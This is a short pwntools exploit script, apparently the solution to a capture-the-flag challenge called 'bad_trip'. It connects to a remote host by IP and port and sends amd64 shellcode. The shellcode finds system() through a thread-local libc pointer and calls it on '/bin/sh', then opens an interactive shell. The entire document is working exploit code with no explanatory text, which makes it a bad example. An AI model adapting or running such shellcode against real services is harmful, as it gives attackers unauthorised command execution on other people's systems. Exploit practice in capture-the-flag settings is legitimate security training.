from pwn import *

# p = process('./bad_trip')
p = remote('172.210.129.230', 1352)
libc = ELF('./libc.so.6')
# e = ELF('./bad_trip')
# libc = e.libc
context.arch = 'amd64'

addr_buf = 0x6969697000
ofs_tls_system = 0x193f20
shellcode = f'''
    mov rsp, {addr_buf}
    mov rcx, fs:0x10
    sub rcx, {ofs_tls_system}
    lea rdi, [rax+0x30]
    xor esi, esi
    xor edx, edx
    call rcx
'''
shellcode = asm(shellcode).ljust(0x30, b'\0')
shellcode += b'/bin/sh\0'

p.sendlineafter(b'>> ', shellcode)
p.interactive()
